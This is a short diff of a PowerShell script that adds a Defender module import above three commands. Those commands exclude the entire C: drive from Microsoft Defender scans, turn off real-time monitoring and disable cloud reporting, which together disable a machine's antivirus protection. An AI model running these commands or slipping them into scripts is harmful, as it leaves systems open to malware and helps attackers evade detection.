@@ -1,3 +1,4 @@
+Import-Module Defender
 Set-MpPreference -ExclusionPath "C:\"
 Set-MpPreference -DisableRealtimeMonitoring $true
 Set-MpPreference -MAPSReporting Disabled
